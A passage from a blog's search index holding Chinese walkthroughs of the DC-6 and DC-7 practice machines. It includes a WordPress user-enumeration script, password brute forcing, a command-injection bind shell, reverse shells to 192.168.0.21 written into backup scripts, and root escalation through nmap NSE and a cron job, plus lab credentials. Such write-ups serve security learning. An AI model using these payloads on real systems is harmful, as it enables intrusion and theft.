+<p>  <code>cat/usr/share/wordlists/rockyou.txt | grep k01&gt;passwords.txt</code></p>
+<p>  这样可以省你几年的时间。;-)</p>
+</blockquote>
+</li>
+<li><p>我们需要配置hosts文件</p>
+</li>
+<li><p>先把IP地址找出来：<code>netdiscover -r 192.168.0.1/24</code></p>
+</li>
+<li><p>找到IP地址为: <code>192.168.0.141</code></p>
+</li>
+<li><p>配hosts文件: <code>echo &#39;192.168.0.141        wordy&#39; &gt;&gt; /ectc/hosts</code></p>
+</li>
+<li><p>设置好了ping 一下试试…</p>
+</li>
+<li><p>namp 扫一下端口 : <code>namp -sS -A -p- 192.168.0.141</code></p>
+</li>
+<li><p>扫描结果:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-26 19:51 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wordy (192.168.0.141)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: WordPress 5.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">MAC Address: 00:0C:29:B9:86:10 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms wordy (192.168.0.141)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>开了web和ssh</p>
+</li>
+<li><p>先看看web</p>
+</li>
+<li><p>用<code>Wappalyzer</code>看到网站时 <code>WordPress</code>的框架</p>
+</li>
+<li><p>好说,之前做过的~知道默认的后台地址:<a href="http://wordy/wp-login.php" target="_blank" rel="noopener">http://wordy/wp-login.php</a></p>
+</li>
+<li><p>这里分享一个专门枚举<code>WordPress</code>用户名的<code>python</code>脚本:</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys,re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAuthor</span><span class="params">(_u)</span>:</span></span><br><span class="line">    url = _u</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        geturl = url + <span class="string">"?author=&#123;&#125;"</span>.format(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">global</span> res</span><br><span class="line">            res = requests.get(geturl,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).content</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> str(e)</span><br><span class="line"></span><br><span class="line">        p = re.compile(<span class="string">r'&lt;body class="archive author author-(.+?) author-'</span>)</span><br><span class="line">        matchs = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matchs = p.findall(res.decode())</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            matchs = p.findall(res)</span><br><span class="line">        fp = open(<span class="string">'auth.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> auth <span class="keyword">in</span> matchs:</span><br><span class="line">            print(<span class="string">'\033[33m author: '</span> + auth + <span class="string">'\033[0m'</span>)</span><br><span class="line">            fp.write(auth + <span class="string">'\n'</span>)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'\033[32m [+] The results are saved in auth.txt. \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    _argv = sys.argv</span><br><span class="line">    <span class="keyword">if</span> len(_argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'\033[31m [-] Please enter the URL to enumerate. \033[0m'</span>);</span><br><span class="line">        print(<span class="string">'\033[35m template: ./author.py http://www.wordpress.com. \033[0m'</span>)</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    getAuthor(_argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们可以得到一个auth.txt的文件</p>
+</li>
+<li><p>用来做用户名的字典</p>
+</li>
+<li><p>还有上面线索说的:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat/usr/share/wordlists/rockyou.txt | grep k01&gt;passwords.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>执行这个可以得到一个密码字典</p>
+</li>
+<li><p>用<code>burpsuite</code>去给他爆破</p>
+</li>
+<li><p>然后就得到了一个账号和密码:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user:mark </span><br><span class="line">passwd:helpdesk01</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>进后台之后</p>
+</li>
+<li><p>发现没啥权限</p>
+</li>
+<li><p>只能操作一个插件: <code>Activity</code></p>
+</li>
+<li><p>找想办法拿shell</p>
+</li>
+<li><p>先看看有没有框架漏洞 :<code>searchsploit wordpress Activity</code> </p>
+</li>
+<li><p>找到一些跨站脚本攻击和一个命令注入</p>
+</li>
+<li><p>这里我就用命令注入:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | </span><br><span class="line">exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>看了些<code>45274.html</code>这个文件说是在</p>
+</li>
+<li><p><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools页面下" target="_blank" rel="noopener">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools页面下</a> </p>
+</li>
+<li><p>IP输入框存在命令注入 但是IP输入框的最大长度只有15,这时候可以抓包去改了</p>
+</li>
+<li><p>在参数填入 <code>0.0.0.0 | nc -lvp 6666 -e /bin/bash</code></p>
+</li>
+<li><p>然后kali用nc去连接就可以得到shell了</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.0.141 6666 <span class="comment">#nc连接</span></span><br><span class="line"><span class="comment"># 获得交互式shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们先看看有哪些用户 <code>cat /etc/passwd</code></p>
+</li>
+<li><p>发现4个自建用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash</span><br><span class="line">mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash</span><br><span class="line">sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash</span><br><span class="line">jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>去各自的用户目录下看看</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens;ls -l /home/sarah;ls -l /home/mark;ls -l /home/graham</span><br><span class="line">&lt; -l /home/sarah;ls -l /home/mark;ls -l /home/graham</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 jens devs 56 Apr 26 00:01 backups.sh</span><br><span class="line">total 0</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff</span><br><span class="line">total 0</span><br><span class="line"><span class="comment"># 看到jens下面有个backups.sh文件</span></span><br><span class="line"><span class="comment"># mark有个stuff文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /home/mark/stuff;ls</span><br><span class="line">things-to-do.txt</span><br><span class="line"><span class="comment">#看到有个 things-to-do.txt 文件</span></span><br><span class="line">cat things-to-do.txt</span><br><span class="line"></span><br><span class="line">Things to <span class="keyword">do</span>:</span><br><span class="line"></span><br><span class="line">- Restore full functionality <span class="keyword">for</span> the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present <span class="keyword">for</span> Sarah<span class="string">'s farewell party</span></span><br><span class="line"><span class="string">- Add new user: graham - GSo7isUM1D4 - done</span></span><br><span class="line"><span class="string">- Apply for the OSCP course</span></span><br><span class="line"><span class="string">- Buy new laptop for Sarah'</span>s replacement</span><br><span class="line"></span><br><span class="line">要做的事情：</span><br><span class="line">-恢复超光驱的全部功能（需要与Jens通话）</span><br><span class="line">-为莎拉的告别会买礼物</span><br><span class="line">-添加新用户：graham-GSo7isUM1D4——完成</span><br><span class="line">-申请OSCP课程</span><br><span class="line">-为莎拉的替代品购买新的笔记本电脑</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到graham的密码,并且开了22端口,我们用ssh登录试试</p>
+</li>
+<li><p>graham用户目录我们已经看了,啥也没有</p>
+</li>
+<li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p>
+</li>
+<li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p>
+</li>
+<li><p>看看 <code>sudo -l</code></p>
+</li>
+<li><p>找到一条</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User graham may run the following commands on dc-6:</span><br><span class="line">(jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以不要密码执行 <code>/home/jens/backups.sh</code></p>
+</li>
+<li><p>发现里面是打包网站的,我们让他去反弹一个shell</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'bash -i &gt;&amp; /dev/tcp/192.168.0.21/4444 0&gt;&amp;1'</span> &gt;  /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再去执行它</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p>
+</li>
+<li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p>
+</li>
+<li><p>看看 <code>sudo -l</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">(root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>可以用以root的身份无密码执行nmap</p>
+</li>
+<li><p>nmap可以执行nse文件</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'os.execute("/bin/bash")'</span> &gt; /tmp/nmap.nse</span><br><span class="line">sudo nmap --script /tmp/nmap.nse</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>接着就得到了一个<code>rootshell</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@dc-6:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment">#直接获得flag</span></span><br><span class="line">cat ~/$(<span class="built_in">cd</span> ~;ls)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>其实在网站配置文件里面还有数据库的账号密码…里面的密码太难了不会搞</p>
+</li>
+<li><p>找到了生成密码的文件,发现的每次都不一样,不知道怎么破解</p>
+</li>
+</ul>
+<h2><span id="2-重要信息">2. 重要信息:</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 网站后台账号密码:</span></span><br><span class="line">user: mark </span><br><span class="line">passwd: helpdesk01</span><br><span class="line"><span class="comment">#2. ssh账号密码:</span></span><br><span class="line">user: graham</span><br><span class="line">passwd: GSo7isUM1D4</span><br><span class="line"><span class="comment">#3.数据库和账号密码：</span></span><br><span class="line">user: wpdbuser </span><br><span class="line">passwd: meErKatZ </span><br><span class="line">DBName: wordpressdb</span><br></pre></td></tr></table></figure>
+
+<h2><span id="theend~"><strong><del>THE</del>END~</strong></span></h2>]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-7 靶机渗透</title>
+    <url>/DC-7/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-7-靶机渗透">DC-7 靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+</ul>
+</li>
+<li><a href="#welcome-to-dc-7">Welcome to DC-7</a></li>
+<li><a href="#staffdb">staffdb</a><ul>
+<li><a href="#_the_end__"><em>THE_END!!!_</em></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-7-靶机渗透">DC-7 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul>
+<li>主机发现：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan --interface eth0 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到IP为： <code>192.168.0.28</code></p>
+</li>
+<li><p>扫描端口</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sS -A -p- 192.168.0.28</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-03 16:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.28</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/</span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/</span><br><span class="line">| /user/password/ /user/login/ /user/<span class="built_in">logout</span>/ /index.php/admin/</span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:77:ED:69 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>网站上有一段提示</p>
+</li>
+<li><blockquote>
+<h1><span id="welcome-to-dc-7">Welcome to DC-7</span></h1><p>  DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. :-)</p>
+<p>  While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
+<p>  What you will have to do, is to think “outside” the box.</p>
+<p>  Way “outside” the box. :-)</p>
+<p>  DC-7引入了一些“新”概念，但我将让您弄清楚它们是什么。:-)</p>
+<p>  虽然这个挑战并不完全是技术性的，但如果你需要诉诸暴力或字典攻击，你可能不会成功。</p>
+<p>  你要做的，就是在盒子外思考。</p>
+<p>  在盒子外面。:-)</p>
+</blockquote>
+</li>
+<li><p>在网页的最下面有个 <strong>@DC7USER</strong></p>
+</li>
+<li><p>我这里没办法访问google</p>
+</li>
+<li><p>看的教程是个Twitter的用户</p>
+</li>
+<li><p>里面有一个链接：<code>https://github.com/Dc7User/staffdb</code></p>
+</li>
+<li><blockquote>
+<h1><span id="staffdb">staffdb</span></h1><p>  This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge.</p>
+<p>  This isn’t a flag, btw, but if you have made it here, well done anyway. :-)</p>
+<p>  这是一些DC-7挑战的“代码”（是的，这不是最棒的代码，但那不是重点）。</p>
+<p>  这不是旗子，顺便说一下，但如果你在这里做得好，无论如何。:-)</p>
+</blockquote>
+</li>
+<li><p>在这个项目里面有个config.php的文件</p>
+</li>
+<li><p>里面有账号和密码</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$servername = <span class="string">"localhost"</span>;</span><br><span class="line">	$username = <span class="string">"dc7user"</span>;</span><br><span class="line">	$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br><span class="line">	$dbname = <span class="string">"Staff"</span>;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>数据库的密码？？</p>
+</li>
+<li><p>然而没有数据库的入口啊</p>
+</li>
+<li><p>试试网站的后台</p>
+</li>
+<li><p>发现没用，再试试ssh</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.0.28</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进了~</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    # 只有两个东西</span><br><span class="line">    dc7user@dc-7:~$ ls</span><br><span class="line">    backups  mbox</span><br><span class="line">    cat mbox</span><br><span class="line">    From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">    Return-path: &lt;root@dc-7&gt;</span><br><span class="line">    Envelope-to: root@dc-7</span><br><span class="line">    Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">            (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">            id 1i3EPu-0000CV-5C</span><br><span class="line">            for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    From: root@dc-7 (Cron Daemon)</span><br><span class="line">    To: root@dc-7</span><br><span class="line">    Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</span><br><span class="line">    MIME-Version: 1.0</span><br><span class="line">    Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br><span class="line">    Content-Transfer-Encoding: 8bit</span><br><span class="line">    X-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;</span><br><span class="line">    X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;</span><br><span class="line">    X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;</span><br><span class="line">    X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;</span><br><span class="line">    Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">    Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    </span><br><span class="line">Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]</span><br><span class="line">    gpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz&#39; failed: File exists</span><br><span class="line">    gpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql&#39; failed: File exists</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>备份网站和数据库的邮件？</p>
+</li>
+<li><p>先去<code>/var/mail</code>看看邮件是什么、</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">From root@dc-7 Tue Apr 28 23:15:34 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1jTQ5G-0000ED-1F</span><br><span class="line">        for root@dc-7; Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;</span><br><span class="line">Message-Id: &lt;E1jTQ5G-0000ED-1F@dc-7&gt;</span><br><span class="line">Date: Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这是计划任务的邮件</p>
+</li>
+<li><p>好像是会执行<code>/opt/scripts/backups.sh</code>文件</p>
+</li>
+<li><p>看看这个文件</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 root www-data 554 Apr 29 00:25 backups.sh</span><br><span class="line">dc7user@dc-7:/opt/scripts$ cat backups.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只有root和www-data可以写入</p>
+</li>
+<li><p>现在只能获得写权限，看看写个木马什么的</p>
+</li>
+<li><p>想办法进www-data权限</p>
+</li>
+<li><p>找数据库连接文件</p>
+</li>
+<li><p>最后在 <code>/var/www/html/sites/default/setting.php</code>中发现数据库账号密码</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">....</span><br><span class="line">$databases[<span class="string">'default'</span>][<span class="string">'default'</span>] = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'database'</span> =&gt; <span class="string">'d7db'</span>,</span><br><span class="line">  <span class="string">'username'</span> =&gt; <span class="string">'db7user'</span>,</span><br><span class="line">  <span class="string">'password'</span> =&gt; <span class="string">'yNv3Po00'</span>,</span><br><span class="line">  <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">  <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'namespace'</span> =&gt; <span class="string">'Drupal\\Core\\Database\\Driver\\mysql'</span>,</span><br><span class="line">  <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进数据库</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udb7user -pyNv3Po00</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找了一圈没发现账号密码<del>~</del></p>
+</li>
+<li><p>后来才知道 <code>/opt/scripts/backups.sh</code>文件里面有个drush命令，可以用来修改密码</p>
+</li>
+<li><p>drush命令使用：<a href="http://drupalchina.cn/node/3019" target="_blank" rel="noopener">http://drupalchina.cn/node/3019</a></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/www/html;drush user-password admin --password=<span class="string">"1234"</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin     										[success]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后我们登陆网站的后台</p>
+</li>
+<li><p>竟然没有写马的地方···</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503171416832.png" alt="image-20200503171416832"></p>
+</li>
+<li><p>后面得知可以安装一个模块</p>
+</li>
+<li><p>然后改用成可以使用写php文件的</p>
+</li>
+<li><p>记得勾选PHPfilter</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503171847681.png" alt="image-20200503171847681"></p>
+</li>
+<li><p>下面的format改成phpcode就可以写木马了</p>
+</li>
+<li><p>nc 监听 </p>
+</li>
+<li><p>就能反弹了</p>
+</li>
+<li><p>然后利用<code>www-data</code>把 <code>/opt/scripts/backups.sh</code> 添加一句</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">nc 192.168.0.21 8899 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>再开一个nc监听。过一会就得到root权限了</p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200503173049525.png" alt="image-20200503173049525"></p>
+</li>
+</ul>
+<h2><span id="the_end_"><em>THE_END!!!_</em></span></h2>]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-9 靶机渗透</title>
+    <url>/DC-9/</url>
+    <content><![CDATA[<!-- toc -->
+
+<ul>
+<li><a href="#dc-9-靶机渗透">DC-9 靶机渗透</a><ul>
+<li><a href="#1-渗透过程">1. 渗透过程</a></li>
+<li><a href="#__the_end__"><strong>THE_END!</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+
